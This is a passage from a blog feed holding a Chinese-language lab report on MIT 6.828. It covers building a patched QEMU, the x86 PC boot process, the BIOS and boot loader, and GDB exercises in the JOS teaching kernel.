    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
  </entry>
  
  <entry>
    <title>【EXPR.0x00】MIT 6.828 课程实验报告</title>
    <link href="http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/"/>
    <id>http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/</id>
    <published>2022-02-20T18:57:25.000Z</published>
    <updated>2022-10-20T16:30:13.929Z</updated>
    
    <content type="html"><![CDATA[<p>不如 Windows XP 好用</p><span id="more"></span><h1>0x00.一切开始之前</h1><blockquote><p>为什么要写这篇博客？参见 <a href="https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/">https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</a></p></blockquote><p>MIT 6.828 是十分著名的一个综合性的操作系统实验课程，由麻省理工大学（MIT）开设，一共有 6 个 lab，基于 XV6——一个为OS课程教学而开发的 OS kernel，手把手带你一步步补全一个操作系统内核。笔者认为这是十分优秀且富有完成价值的一个 OS 实验，因此笔者决定趁大三寒假实习的空闲时间将本课程补完。</p><p>笔者选用其 2018 年的实验课程，因为自从 2019 起他们转向了 RISC-V，而笔者暂时不想离开 X86 的舒适区（笑），因为本次实验的主要目的还是学习操作系统，笔者不想在学习其他架构上花费太多时间</p><h2 id="PRE-环境搭建">PRE.环境搭建</h2><blockquote><p>参见 <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">https://pdos.csail.mit.edu/6.828/2018/tools.html</a></p><h1>Tools Used in 6.828</h1><p>You’ll use two sets of tools in this class: an x86 emulator, <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#qemu">QEMU</a>, for running your kernel; and a <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#chain">compiler toolchain</a>, including assembler, linker, C compiler, and debugger, for compiling and testing your kernel. This page has the information you’ll need to download and install your own copies. This class assumes familiarity with Unix commands throughout.</p><p>We highly recommend using a Debathena machine, such as <a href="http://athena.dialup.mit.edu">athena.dialup.mit.edu</a>, to work on the labs. If you use the MIT Athena machines that run Linux, then all the software tools you will need for this course are located in the 6.828 locker: just type ‘add -f 6.828’ to get access to them.</p><p>If you don’t have access to a Debathena machine, we recommend you use a virtual machine with Linux. If you really want to, you can build and install the tools on your own machine. We have instructions below for Linux and MacOS computers.</p><p>It should be possible to get this development environment running under windows with the help of <a href="http://www.cygwin.com/">Cygwin</a>. Install cygwin, and be sure to install the flex and bison packages (they are under the development header).</p><p>For an overview of useful commands in the tools used in 6.828, see the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>.</p></blockquote><p>为了开始本次实验，我们主要需要这两样东西：</p><ul><li><p>一个 x86 模拟器：QEMU——用以运行内核</p></li><li><p>一套编译工具，包括汇编器、链接器、C 编译器、调试器——用以编译与测试内核</p></li></ul><h3 id="Compiler-Toolchain">Compiler Toolchain</h3><p>为了完成本次实验，笔者用了一个近乎全新的 Ubuntu 21.10，按课程页面进行如下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y build-essential gdb</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>检查，出现类似下面的输出说明安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -m32 -print-libgcc-file-name</span><br>/usr/lib/gcc/x86_64-linux-gnu/8/32/libgcc.a<br></code></pre></td></tr></table></figure><h3 id="QEMU-Emulator">QEMU Emulator</h3><p>为了更好地进行实验，MIT 6.828 课程的教师们将 qemu 进行了一定的改造，因此我们需要手动编译安装 patch 后的 QEMU</p><p>首先补充安装一些库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install libsdl1.2-dev libtool-bin libglib2.0-dev libz-dev libpixman-1-dev</span><br></code></pre></td></tr></table></figure><p>从 GitHub 拉源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/mit-pdos/6.828-qemu.git qemu</span><br></code></pre></td></tr></table></figure><p>在源码目录下进行需要的配置，<code>[]</code> 里的是可选项（输入命令时不带这个框）</p><ul><li><p><code>--prefix=PFX</code>：指定安装 qemu 的目录，若未指定则默认为 <code>/usr/local</code></p></li><li><p><code>--target-list=&quot;i386-softmmu x86_64-softmmu</code>：精简化要安装的架构</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./configure --disable-kvm --disable-werror [--prefix=PFX] [--target-list=<span class="hljs-string">&quot;i386-softmmu x86_64-softmmu&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>最后编译就完事了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="可能出现的错误">可能出现的错误</h3><p>笔者在编译 qemu 时遇到了这样的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">...<br>  CC    stubs/qmp_pc_dimm_device_list.o<br>  AR    libqemustub.a<br>  LINK  qemu-ga<br>/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:<br>/home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:633: undefined reference to `major&#x27;<br>/usr/bin/ld: /home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:634: undefined reference to `minor&#x27;<br>collect2: error: ld returned 1 exit status<br>make: *** [Makefile:288: qemu-ga] Error 1<br></code></pre></td></tr></table></figure><p>参照 <a href="http://patchwork.ozlabs.org/patch/709415/">[v3] build: include sys/sysmacros.h for major() and minor() - Patchwork</a> ，在 qemu 源码目录下的 <code>qga/commands-posix.c</code> 加上一个 <code>#include &lt;sys/sysmacros.h&gt;</code></p><p>继续 make install，之后还可能出现这样一个错误：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">...<br>  Building optionrom/kvmvapic.img<br>  Building optionrom/kvmvapic.raw<br>  Signing optionrom/kvmvapic.bin<br>install -d -m <span class="hljs-number">0755</span> <span class="hljs-string">&quot;/usr/local/share/qemu&quot;</span><br>install: cannot change permissions of ‘<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>qemu’: No such <span class="hljs-keyword">file</span> or directory<br>make: *** [Makefile:<span class="hljs-number">382</span>: install-datadir] Error <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>我们手动创建 <code>/usr/local/share/qemu</code> 这个目录即可</p><p>之后继续 make install，又报缺一个目录的错误（不能一次报完嘛 - - ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">install -d -m 0755 &quot;/usr/local/share/qemu&quot;<br>install -d -m 0755 &quot;/usr/local/etc/qemu&quot;<br>install: cannot change permissions of ‘/usr/local/etc/qemu’: No such file or directory<br>make: *** [Makefile:392: install-confdir] Error 1<br></code></pre></td></tr></table></figure><p>依旧手动创建之，然后 make install，这里需要注意我们应当以 root 权限执行</p></blockquote><h1>0x01.Lab 1: Booting a PC</h1><blockquote><p>lab 页面： <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/%5D">[https://pdos.csail.mit.edu/6.828/2018/labs/lab1/]</a>(<a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">Lab 1: PC Bootstrap and GCC Calling Conventions</a>)</p></blockquote><blockquote><p>该 lab 大量内容与 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a>重复，<strong>相关知识笔者于本篇博客中仅做简述，不再重复摘抄，如有需要请自行阅读笔者的这篇博客</strong></p></blockquote><p>该 lab 总共三个部分：</p><ul><li><p>熟悉 x86 汇编语言、QEMU x86 模拟器、PC的开机引导流程</p></li><li><p>测试我们用于引导内核的 boot loader（xv6源码下 <code>boot</code> 目录）</p></li><li><p>深入研究 6.828 内核的初始模板（JOS）</p></li></ul><p>在开始实验之前我们首先把 xv6 源码拉到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://pdos.csail.mit.edu/6.828/2018/jos.git lab</span><br></code></pre></td></tr></table></figure><p>对于 MIT 的学生来说需要将实验过程 <code>make handin</code> 之后提交到对应的仓库，不过笔者只是大洋彼岸旁听的（笑）所以这一步就跳过了</p><h2 id="Part-1-PC-Bootstrap">Part 1: PC Bootstrap</h2><p>这一部分的主要目的是让学生熟悉<strong>一个计算机是如何启动的</strong>，通电——载入 BIOS——BIOS载入 MBR——跳转到 MBR——（载入 loader）——载入内核</p><blockquote><p>参见笔者的<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">这篇博客</a></p></blockquote><h3 id="Getting-Started-with-x86-assembly">Getting Started with x86 assembly</h3><p>MIT 为那些不熟悉 x86 汇编语言的人准备了 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pcasm-book.pdf">PC Assembly Language Book</a>，接下来我们来看 Exercise1：</p><blockquote><p>Exercise 1. Familiarize yourself with the assembly language materials available on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">the 6.828 reference page</a>. You don’t have to read them now, but you’ll almost certainly want to refer to some of this material when reading and writing x86 assembly.</p><p>We do recommend reading the section “The Syntax” in <a href="http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html">Brennan’s Guide to Inline Assembly</a>. It gives a good (and quite brief) description of the AT&amp;T assembly syntax we’ll be using with the GNU assembler in JOS.</p></blockquote><p>这一部分主要就是熟悉 x86 汇编语言，笔者在高中的时候就已经会了故这里直接跳过（笑），不过其推荐的材料还是值得一读的。</p><p>比较令笔者不适的是实验中涉及到的汇编代码都是丑陋的 AT&amp;T 语法而并非优美的 x86 语法（恼）</p><h3 id="Simulating-the-x86">Simulating the x86</h3><p>这一步我们开始编译 JOS（xv6）并尝试使用 qemu 运行，在刚刚 clone 下来的源码目录下进行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>+ as kern/entry.S<br>+ cc kern/entrypgdir.c<br>+ cc kern/init.c<br>+ cc kern/console.c<br>+ cc kern/monitor.c<br>+ cc kern/printf.c<br>+ cc kern/kdebug.c<br>+ cc lib/printfmt.c<br>+ cc lib/readline.c<br>+ cc lib/string.c<br>+ ld obj/kern/kernel<br>ld: warning: section `.bss&#x27; type changed to PROGBITS<br>+ as boot/boot.S<br>+ cc -Os boot/main.c<br>+ ld boot/boot<br>boot block is 412 bytes (max 510)<br>+ mk obj/kern/kernel.img<br></code></pre></td></tr></table></figure><p>其会生成一个磁盘镜像文件</p><p>接下来启动 qemu，MIT 在其提供的 Makefile 文件中写好了启动的代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu</span><br></code></pre></td></tr></table></figure><p>启动界面如下，这两个界面都可以进行输入，还是十分方便的：</p><p><img src="https://s2.loli.net/2022/02/20/FCqAQm85o3OUzKH.png" alt="imagepng"></p><p>在最初时 JOS 只提供了两个命令：<code>help</code> 和 <code>kerninfo</code>，<strong>补完剩下的功能让其成为一个完整的内核便是我们在后面几个 lab 中要做的事情</strong> <img src="https://s2.loli.net/2022/02/20/RmXtkdYnL7HGCK5.png" alt="imagepng"></p><h3 id="The-PC’s-Physical-Address-Space">The PC’s Physical Address Space</h3><p>一台 PC 的物理地址通常遵循如下布局（32位下）：</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mercury">+------------------+  &lt;- <span class="hljs-number">0</span>xFFFFFFFF (<span class="hljs-number">4</span>GB)<br>|      <span class="hljs-number">32</span>-bit      |<br>|  memory mapped   |<br>|     devices      |<br>|                  |<br><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><br><br><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><br>|                  |<br>|      Unused      |<br>|                  |<br>+------------------+  &lt;- depends on amount of RAM<br>|                  |<br>|                  |<br>| Extended Memory  |<br>|                  |<br>|                  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x00100000 (<span class="hljs-number">1</span>MB)<br>|     BIOS ROM     |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000F0000 (<span class="hljs-number">960</span>KB)<br>|  <span class="hljs-number">16</span>-bit devices, |<br>|  expansion ROMs  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000C0000 (<span class="hljs-number">768</span>KB)<br>|   VGA Display    |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000A0000 (<span class="hljs-number">640</span>KB)<br>|                  |<br>|    Low Memory    |<br>|                  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x00000000<br></code></pre></td></tr></table></figure><blockquote><p>关于前面这 1MB 的具体内存布局，可以参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a></p></blockquote><h3 id="The-ROM-BIOS">The ROM BIOS</h3><p>在这部分实验中我们将使用 gdb 来调试 qemu，MIT 同样在 Makefile 中编写好了相应的命令行，我们只需要在第一个终端界面中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu-gdb</span><br></code></pre></td></tr></table></figure><p>其会启动一个等待 gdb 连接 的qemu</p><p><img src="https://s2.loli.net/2022/02/20/rdO63wCxPUovYsN.png" alt="imagepng"></p><p>接下来在第二个终端中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make gdb</span><br></code></pre></td></tr></table></figure><p>其会启动 gdb 并自动连接上 qemu，这里我们可以看到 <code>CS:IP</code> 为 <code>0xf000:0xfff0</code>，即此时执行的代码地址为 <code>0xffff0</code> ，其实就是 <strong>BIOS 的入口点</strong></p><p><img src="https://s2.loli.net/2022/03/15/G8adZYg3pk9lBRr.png" alt="image.png"></p><blockquote><p>为了原汁原味模拟 MIT 实验的感觉，笔者并未装上 pwn 手常用的 pwndbg 插件（其实只是懒 + 怕出现奇怪的问题）</p></blockquote><p>MIT 对这个启动过程总结出如下三点：</p><ul><li><p>IBM PC 启动时执行 0x000ffff0 处代码，这是为 ROM BIOS 保留的内存区域的顶部</p></li><li><p>PC 启动时 <code>CS = 0xf000</code>，<code>IP = 0xfff0</code></p></li><li><p>执行的第一条指令为跳转指令，跳转至<code>CS = 0xf000, IP = 0xe05b</code> 处</p></li></ul><p>为什么QEMU 的启动流程是这样的？这首先是 Intel 设计 8088 处理器的模式，之后被 IBM 用在了最初的 PC 上，这是因为在 PC 上， BIOS 被“硬连线”（hard-wired）到物理地址的 <code>0x0000f0000 - 0x000fffff</code> 处（物理地址起始 64KB），这个设计保证了 BIOS 在启动或是系统重启时总能是第一个拿到机器控制权的，因为此时 RAM 中还没有任何其他的软件可以让处理器运行（笔者认为这是一句废话）。QEMU 自己有着一个 BIOS，在处理器复位后，其处在实模式下，且会将 <code>CS:IP</code> 设置为 <code>0xf000:0xfff0</code>，因此 PC 从此处的代码开始执行——将 CS 寄存器左移 4 位再加上 IP 寄存器便获得了当前执行的代码的地址 <code>0xffff0</code>——20位的地址线撑起了 1MB 的内存空间。</p><blockquote><p>当笔者翻译完 MIT 实验页面的这一段话之后发现这完全没有任何意义——对于二进制人来说这是再基础不过的知识了，因此后面只会酌情引入 MIT 实验文档的翻译，更多的是笔者自己认为有必要写下的笔记，例如上面的这一段话的末尾部分便是笔者自己写的。</p></blockquote><p>接下来看 Exercise 2，主要是让我们尝试跟进调试一下 BIOS，感受一下他会做些什么：</p><blockquote><p>Exercise 2. Use GDB’s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at <a href="http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm">http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm</a>, as well as other materials on the <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">6.828 reference materials page</a>. No need to figure out all the details - just the general idea of what the BIOS is doing first.</p></blockquote><p>BIOS 主要完成的工作便是设置中断向量表（Interrupt Vector Table，位于 <code>0x000 ~ 0x3fff</code>），初始化一些设备（例如 VGA display），此时显存被映射到 <code>0xa0000 ~ 0xbffff</code>，显示适配器的 BIOS 被加载到 <code>0xc0000 ~ 0xc7fff</code>，此时<strong>我们直接向显存映射区写入内容便可以在屏幕上显示字符</strong></p><p>之后 BIOS 会读出硬盘上的<strong>第一个扇区</strong>到 <code>0x7c00</code> 处，<strong>并跳转到该处</strong>，我们称被载入的第一个扇区为<strong>主引导记录</strong>（Master Boot Record, aka MBR），其从 BIOS 手中接过启动 PC 的接力棒</p><blockquote><p>MIT 原实验文档中写的是 BIOS 将中断描述符表（Interrupt Descriptor Table）载入到内存当中，但笔者认为在<strong>实模式下应当为中断向量表</strong>，这是因为中断描述符是一个属于保护模式下的概念，这里做出改正</p></blockquote><h2 id="Part-2-The-Boot-Loader">Part 2: The Boot Loader</h2><p>通常 PC 的硬盘与软盘上的空间被按照 <code>扇区</code> 进行划分，最常见的扇区大小为 <code>512B</code>，单个扇区也是我们读写磁盘最小的操作单位，若磁盘是可引导的，则第一个扇区称为<strong>引导扇区</strong>，因为该扇区中存放着 <em>引导加载程序</em> 的代码，BIOS 在 PC 启动后完成其工作后会将该扇区读到内存中的 <code>0x7c00 ~ 0x7fff</code> 处，之后使用一个 <code>jmp</code> 跳转指令跳转至 <code>CS:IP = 0000:7C00</code>，将控制权交给这一部分代码</p><blockquote><p>MIT 文档认为，这个地址是相当随意的，<strong>但经笔者考证这是一个有来头的地址</strong>，参见<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a></p></blockquote><p>由于 CD-ROM 的出现在 PC 发展史中较晚，这给了 PC 架构师足够的时间去重新思考并设计功能更加强大的引导方式，CD-ROM 通常使用 <code>2048B</code> 的扇区大小，且 BIOS 会将更多的扇区作为引导映像载入内存中，这部分内容可以参见<a href="https://pdos.csail.mit.edu/6.828/2018/readings/boot-cdrom.pdf">&quot;El Torito&quot; Bootable CD-ROM Format Specification</a></p><p>6.828 的 boot loader 包含两个文件：<code>boot/boot.S</code> 与 <code>boot/main.c</code>，其完成以下两个工作：</p><ul><li><p>将处理器<strong>从实模式切换到保护模式</strong>（boot.S）</p><ul><li><p>打开 A20-Gate 以支持大于 1MB 的地址空间</p></li><li><p>加载全局段描述符表</p></li><li><p>设置 cr0 寄存器对应标志位，进入保护模式</p></li></ul></li><li><p>通过 x86 的特殊 I/O 指令从磁盘上读取内核并将之载入内存，跳转到内核（boot.c）</p><ul><li><p>通过 <code>in</code> 与 <code>out</code> 这两条指令读取磁盘数据</p></li><li><p>检查并分析 ELF header，跳转到内核</p></li></ul></li></ul><p>在大二下学习操作系统课程时笔者有幸尝试亲手写过一个内核（虽然远没有完成），其中就包括写 loader，因此这一部分笔者还是相对较为熟悉的，不过 MIT 代码的精炼程度远非笔者从 <em>另一本书上抄抄改改而来的代码</em> 所能比拟的，推荐大家仔细阅读（笑）</p><p>下面看 Exercise 3，主要是参照 6.828 的手册学习 GDB，这里就不贴过程了：</p><blockquote><p>Exercise 3. Take a look at the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>, especially the section on GDB commands. Even if you’re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work.</p><p>Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code in boot/boot.S, using the source code and the disassembly file obj/boot/boot.asm to keep track of where you are. Also use the x/i command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly in obj/boot/boot.asm and GDB.</p><p>Trace into bootmain() in boot/main.c, and then into readsect(). Identify the exact assembly instructions that correspond to each of the statements in readsect(). Trace through the rest of readsect() and back out into bootmain(), and identify the begin and end of the for loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader.</p></blockquote><p>6.828 还提供给我们一份反编译后的 loader 文件，位于 <code>obj/boot/boot.asm</code>，为上面两个文件编译后在内存中的样子，并附上了贴心的注释，推荐大家配合着这份文件进行调试，<strong>极致享受</strong>（笑）</p><p><img src="https://s2.loli.net/2022/02/20/pGUmRero8DqvH5j.png" alt="imagepng"></p><p>接下来解决一些 6.828 的习题：</p><ul><li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</p><ul><li><p>在 <code>boot.main.c</code> 中的 bootmain() 中通过 <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> 跳转到内核入口点</p></li><li><p>当 MBR 设置了 cr0 寄存器的 <code>PE</code> 标志位后，处理器从实模式进入到保护模式，对应的汇编代码为 <code>ljmp $0x8,$0x7c32</code>，<strong>这是在加载了全局段描述符表后使用代码段描述符完成的一个跳转指令</strong></p><p><img src="https://s2.loli.net/2022/02/20/bDBS7YIQpKEAlqJ.png" alt="imagepng"></p></li></ul></li><li><p>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</p><ul><li><p>boot loader 执行的最后一条指令为<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>，对应汇编代码 <code>call *0x10018</code>——这是 kernel 的入口点，而 kernel 执行的第一条指令为 <code>movw $0x1234, 0x472</code></p><p><img src="https://s2.loli.net/2022/02/20/DHyfhqPj7NgbsT6.png" alt="imagepng"></p></li></ul></li><li><p><em>Where</em> is the first instruction of the kernel?</p><ul><li>kernel 的第一条指令在其 ELF 入口点标注的位置，这里是 <code>0x10018</code></li></ul></li><li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</p><ul><li>loader 首先会从磁盘上读取前面一张页的内容（大小0x1000），在判断这是一个合法的 ELF header 之后解析其节表（其中包含每一节（section，也称段（segment））的相关信息，包括该段在文件内的偏移（p_offset）、在内存中的加载地址（p_vaddr）、在文件中的大小（p_filesz）、该段在内存中的大小（p_memsz）、该段的标志位（p_flags，主要标识 rwx 权限）），根据节表信息从磁盘上读取数据</li></ul></li></ul><h3 id="Loading-the-Kernel">Loading the Kernel</h3><p>首先看 Exercise 4，主要是<strong>复习</strong>你的 C 语言知识，尤其是关于指针的那一部分（笑），这一块可以参考大名鼎鼎的 K&amp;R C，以及装载链接ELF文件等基础知识，笔者推荐阅读《程序员的自我修养》</p><blockquote><p>Exercise 4. Read about programming with pointers in C. The best reference for the C language is <em>The C Programming Language</em> by Brian Kernighan and Dennis Ritchie (known as ‘K&amp;R’). We recommend that students purchase this book (here is an <a href="http://www.amazon.com/C-Programming-Language-2nd/dp/0131103628/sr=8-1/qid=1157812738/ref=pd_bbs_1/104-1502762-1803102?ie=UTF8&amp;s=books">Amazon Link</a>) or find one of <a href="http://library.mit.edu/F/AI9Y4SJ2L5ELEE2TAQUAAR44XV5RTTQHE47P9MKP5GQDLR9A8X-10422?func=item-global&amp;doc_library=MIT01&amp;doc_number=000355242&amp;year=&amp;volume=&amp;sub_library=">MIT’s 7 copies</a>.</p><p>Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/pointers.c">pointers.c</a>, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted.</p><p>There are other references on pointers in C (e.g., <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pointers.pdf">A tutorial by Ted Jensen</a> that cites K&amp;R heavily), though not as strongly recommended.</p><p><em>Warning:</em> Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you don’t want to find out what “the hard way” is.</p></blockquote><p>接下来是 Exercise 5，主要是改 Makefile 文件中指定的链接地址然后重新调试体验一下，这里就跳过了</p><blockquote><p>Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would “break” or otherwise do the wrong thing if you were to get the boot loader’s link address wrong. Then change the link address in boot/Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Don’t forget to change the link address back and make clean again afterward!</p></blockquote><p>最后是 Exercise 6，使用 GDB 指令在 BIOS 将控制权交给 MBR 时查看内存 <code>0x00100000</code> 处的数据</p><blockquote><p>Exercise 6. We can examine memory using GDB’s x command. The <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html">GDB manual</a> has full details, but for now, it is enough to know that the command x/<em>N</em>x <em>ADDR</em> prints <em>N</em> words of memory at <em>ADDR</em>. (Note that both 'x’s in the command are lowercase.) <em>Warning</em>: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the ‘w’ in xorw, which stands for word, means 2 bytes).</p><p>Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.)</p></blockquote><p>虽然要求只看 8 个 word，但是笔者还是习惯多看一些（笑），这里可以看到在刚刚运行到 MBR 时该处数据都是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 